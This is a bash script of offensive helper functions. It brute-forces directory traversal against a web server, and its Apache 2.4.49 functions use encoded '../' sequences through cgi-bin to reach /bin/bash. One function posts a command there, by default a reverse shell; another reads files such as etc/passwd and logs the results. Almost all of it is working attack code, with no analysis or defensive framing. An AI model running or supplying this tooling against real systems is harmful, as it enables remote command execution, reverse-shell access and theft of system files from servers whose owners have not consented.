#!/bin/bash
traverse() {
  ip=$1
  port=$2
  starting_url=$3
  target_dir=$4
  starting_index=$5
  url_front="http://$ip:$port/"

  if [[ -z "$starting_index" ]]; then
    if [[ -f "traverse_success.txt" ]]; then
      starting_index=$(cat traverse_success.txt | grep "$ip $port $starting_url $target_dir" | awk '{print $5}')      
      echo "No starting index provided, using last successful index: $starting_index"   
    fi   
    if [[ -z "$starting_index" ]]; then
      echo "Using default starting index: 1"
      starting_index=1 
    fi 

  fi

  if [[ $starting_url != "" ]]; then
    url_front="${url_front}${starting_url}"
  fi
  content=""
  if [[ -z "$target_dir" || -z "$ip" || -z "$port" || -z "$url_front" ]]; then
    echo "Usage: $0 <ip> <port> <starting_url> <target_directory> "
    exit 1
  fi
  traverse_url=""
  for i in {1..10}; do
    traverse_url="$traverse_url$(urlencode '..')/"
    if [[ $i -lt $starting_index ]]; then
      continue
    fi    
    curl_url="${url_front}${traverse_url}${target_dir}"
    echo "Fetching: $curl_url"
    content=$(curl -i --path-as-is -s "$curl_url" 2>&1)
    status=$(traverse_success "$content")
    echo "Status: $status"
    if [[ $status == "true" ]]; then
      echo "Traversal successful: $curl_url"
      traverse_output "$content"
      if [[ -f "traverse_success.txt" ]]; then
        original_starting_index=$(cat traverse_success.txt | grep "$ip $port $starting_url $target_dir" | awk '{print $5}')
        if [[ -z "$original_starting_index" ]]; then
          echo "No previous starting index found, adding new entry"
          echo "$ip $port $starting_url $target_dir $i" >> traverse_success.txt   
        else
          echo "Updating starting index from $original_starting_index to $i"   
          echo "ip=$ip port=$port starting_url=$starting_url target_dir=$target_dir i=$i"       
          match_regex="$(escape_regex $ip) $port $(escape_regex $starting_url) $(escape_regex $target_dir) ${original_starting_index}"
          replacement_text="$(escape_regex $ip) $port $(escape_regex $starting_url) $(escape_regex $target_dir) $i"
          echo "Replacing: $match_regex with $replacement_text"
          sed -i "s/${match_regex}/${replacement_text}/" traverse_success.txt

        fi
      else
        echo "Creating traverse_success.txt with entry: $ip $port $starting_url $target_dir $i"
        echo "$ip $port $starting_url $target_dir $i" > traverse_success.txt
      fi
      break
    else
      echo "Attempt on $curl_url failed"
    fi
  done
}

escape_regex() {
  local input="$1"
  local escaped_input="${input//./\\.}"
  local escaped_input="${input//&/\\&}"
  local escaped_input="${escaped_input//\//\\/}"
  echo "$escaped_input"
}

apache_2449_cgi() {
  local level=$1
  local port=$2
  local script=$3
  local cmd=$4
  if [[ -z "$level" ]]; then
    level=4
  fi
  if [[ -z "$script" ]]; then
    script="bin/bash"
  fi
  up=""
  for i in $(seq 1 $level); do
    up+="../"
  done
  path="cgi-bin/$up""$script"
  echo "Traversing to: $path"
  path=$(echo $path | sed 's/\.\./%2e%2e/g')
  if [[ -z "$cmd" ]]; then
    cmd=$(get_bash_reverse_shell)
  fi
  if [[ -z "$port" ]]; then
    port=80  # Default port if not set
  fi
  if [[ -z "$ip" ]]; then
    echo "IP not set, cannot execute command."
    return 1
  fi
  if [[ -z "$trail_log" ]]; then
    trail_log="trail.log"
  fi
  if [[ -d "$log_dir" ]]; then
    trail_log="$log_dir/trail.log"
  fi
  curl -s --path-as-is -d "$cmd" "http://$ip:$port/$path" | tee -a $trail_log

}

apache_2449_nocgi() {
  local level=$1
  local target=$2
  local output=$3
  if [[ -z "$level" ]]; then
    level=4
  fi
  up=""
  for i in $(seq 1 $level); do
    up+="../"
  done
  if [[ -z "$target" ]]; then
    target="etc/passwd"
  fi  
  path="cgi-bin/$up""$target"
  echo "Traversing to: $path"
  path=$(echo $path | sed 's/\.\./%2e%2e/g')
  cmd=$(get_bash_reverse_shell)
  if [[ -z "$port" ]]; then
    port=80  # Default port if not set
  fi
  if [[ -z "$ip" ]]; then
    echo "IP or port not set, cannot execute command."
    return 1
  fi
  if [[ -z "$trail_log" ]]; then
    trail_log="trail.log"
  fi
  if [[ -d "$log_dir" ]]; then
    trail_log="$log_dir/trail.log"
  fi  
  if [[ ! -z "$output" ]]; then
      curl_output_option="-o $output"  
  fi
  curl -s $curl_output_option --path-as-is "http://$ip:$port/$path" | tee -a $trail_log

}